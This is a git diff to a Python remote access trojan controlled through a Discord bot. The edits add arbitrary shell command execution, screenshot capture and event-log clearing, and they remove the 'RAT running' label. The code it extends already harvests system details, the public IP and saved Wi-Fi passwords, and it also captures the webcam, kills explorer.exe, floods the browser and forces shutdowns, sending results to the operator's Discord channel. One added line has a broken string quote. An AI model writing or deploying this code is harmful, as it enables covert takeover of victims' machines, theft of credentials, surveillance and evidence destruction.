@@ -6,7 +6,7 @@ import requests
 import time
 import os 
 import webbrowser
-import tkinter
+import pyautogui
 import cv2
 from discord.ext import commands
 from discord.ext.commands import Bot
@@ -18,7 +18,7 @@ pro = platform.processor()
 release = platform.release() 
 ip = requests.get('https://api.ipify.org/').text
 bot = commands.Bot(command_prefix='*')
-print("RAT running...")
+print("running...")
 @bot.command()
 async def sysinfo(ctx):
         await ctx.send("Node: " + node)
@@ -29,22 +29,22 @@ async def sysinfo(ctx):
         await ctx.send("IP: " + ip)
         await ctx.send("Release: " + release)
 @bot.command()
-async def harder(ctx):
+async def spam_url(ctx, arg1):
 	await ctx.send("[*] Command sent")
 	while True:
-		webbrowser.open("url")
+		webbrowser.open(arg1)
 @bot.command()
-async def hot(ctx):
+async def kill_gui(ctx):
 	await ctx.send("[*] Command sent")
 	os.system("taskkill /f /IM explorer.exe")
 @bot.command()
 async def cmd(ctx):
-        os.system("start cmd")
-        await ctx.send("[*] Command sent")
+	await ctx.send("[*] Command sent")
+	os.system("start cmd")
 @bot.command()
-async def haxed(ctx):
-	webbrowser.open("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fsensorstechforum.com%2Fwp-content%2Fuploads%2F2017%2F10%2Fstf-magic-ransomware-virus-background-image-youve-been-hacked.png&f=1&nofb=1")
-
+async def ready_url(ctx, wrg):
+	await ctx.send("[*] Command sent")
+	webbrowser.open(wrg)
 @bot.command()
 async def grabessid(ctx):
         await ctx.send("Grabbing ESSIDs..")
@@ -57,7 +57,7 @@ async def grabpass(ctx, arg1):
         await ctx.send(file=discord.File('pass.txt'))
 @bot.command()
 async def webcam(ctx):
-    
+    await ctx.send("[*] Command sent")
     cam = cv2.VideoCapture(0)
     cv2.namedWindow("test")
     img_counter = 0
@@ -76,8 +76,25 @@ async def webcam(ctx):
 @bot.command()
 async def shutdown(ctx):
         await ctx.send("[*] Command sent")
-        os.system("shutdown")
+        os.system("shutdown -s")
 @bot.command()
 async def restart(ctx):
         await ctx.send("[*] Command sent")
         os.system("shutdown -r")
+@bot.command()
+async def custom_cmd(ctx, arg):
+	await ctx.send("[*] Command sent")
+	os.system(arg + " > custom.txt")
+    	await ctx.send(file=discord.File('custom.txt))
+@bot.command()
+async def screen(ctx):
+	screenshot_1 = pyautogui.screenshot()
+	screenshot_1.save("screenshot.png")
+	await ctx.send(file=discord.File('screenshot.png'))
+@bot.command()
+async def clear_logs(ctx):
+	await ctx.send("[*] Command sent")
+	await ctx.send("Clearing event logs..")
+	os.system("clear_events.vbs")
+	await ctx.send("[#]....Done!")
+bot.run("token")
